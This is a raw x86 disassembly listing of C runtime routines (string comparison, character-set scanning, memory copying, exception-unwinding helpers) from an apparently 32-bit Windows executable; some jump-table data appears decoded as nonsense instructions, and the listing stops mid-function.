  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
